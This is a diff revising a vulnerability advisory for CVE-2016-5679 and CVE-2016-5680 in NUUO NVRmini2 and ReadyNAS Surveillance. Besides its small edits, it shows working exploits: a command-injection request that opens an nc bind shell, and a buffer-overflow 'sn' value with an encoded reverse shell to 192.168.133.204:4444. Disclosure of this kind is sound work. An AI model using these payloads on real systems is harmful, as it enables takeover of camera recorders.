@@ -154,7 +154,7 @@ NVRsolo:
 
   
 #6 
-Vulnerability: Command injection in cgi_main transfer license command
+Vulnerability: Command injection in cgi_main transfer_license command
 CVE-2016-5679
 Attack Vector: Local / Remote
 Constraints: Requires an administrator account if exploited remotely; can be exploited locally by any logged in user
@@ -164,6 +164,8 @@ Affected products / versions:
 
 The transfer_license command has a command injection vulnerability in the "sn" parameter:
 cgi_main?cmd=transfer_license&method=offline&sn=";<command>;#
+
+This is due to the input of the "sn" parameter being passed directly into the system() C function in the cgi_main binary (see #7 for the relevant snippet of the transfer_license function code).
 
 Sample exploit for NVRmini2 (open bind shell on port 4444):
 GET /cgi-bin/cgi_main?cmd=transfer_license&method=offline&sn="%3bnc+-l+-p+4444+-e+/bin/sh+%26+%23
@@ -178,14 +180,14 @@ The cgi_main binary is located at "/apps/surveillance/bin/cgi_main" on the Ready
       
       
 #7 
-Vulnerability: Stack buffer overflow in cgi_main transfer license command
+Vulnerability: Stack buffer overflow in cgi_main transfer_license command
 CVE-2016-5680
 Attack Vector: Local / Remote
 Constraints: Requires an administrator account if exploited remotely; can be exploited locally by any logged in user
 - NUUO NVRmini 2, firmware v1.7.6 to 3.0.0 (older firmware versions might be affected)
 - ReadyNAS Surveillance, v1.1.2 (x86 and older versions might be affected)
 
-The "sn" parameter in transfer_license cgi_main method not only has a command injection vulnerability, but also a stack buffer overflow. Below is the pseudocode of the affected function - as it can be seen in the sprintf line, the "sn" parameter is copied directly into a string with a fixed length of 128 characters.
+The "sn" parameter in transfer_license cgi_main method not only has a command injection vulnerability, but also a stack buffer overflow. Below is a snippet of the affected function that handles the transfer_license command - as it can be seen in the sprintf line, the "sn" parameter is copied directly into a string with a fixed length of 128 characters.
 
 Function 0x20BC9C (NVRmini2 firmware v3.0.0):
       method = getval("method");
@@ -287,7 +289,7 @@ sn=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
 Exploit for ReadyNAS Surveillance v1.1.2 ("sn" parameter value):
 sn=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa%91%66%cd%b6%bc%91%ef%b6aaaa%9c%1d%d8%b6aaaaaaaaaaaa%6d%6b%66%69%66%6f%20%2f%74%6d%70%2f%73%3b%20%2f%62%69%6e%2f%62%61%73%68%20%2d%69%20%3c%20%2f%74%6d%70%2f%73%20%32%3e%26%31%20%7c%20%6f%70%65%6e%73%73%6c%20%73%5f%63%6c%69%65%6e%74%20%2d%71%75%69%65%74%20%2d%63%6f%6e%6e%65%63%74%20%31%39%32%2e%31%36%38%2e%31%33%33%2e%32%30%34%3a%34%34%34%34%20%3e%20%2f%74%6d%70%2f%73%3b%20%72%6d%20%2f%74%6d%70%2f%73%20%26
 
-Note that due to the ASLR in the ReadyNAS his exploit has be attempted at few times in order for it to work. Usually less than 20 tries is enough to get the reverse shell to connect back.
+Note that due to the ASLR in the ReadyNAS this exploit has be attempted at few times in order for it to work. Usually less than 20 tries is enough to get the reverse shell to connect back.
 
 > Local exploitation:
 This vulnerability can be exploited locally by a logged in user to escalate privileges to root on the NVRmini2 and admin on the ReadyNAS with the following command:
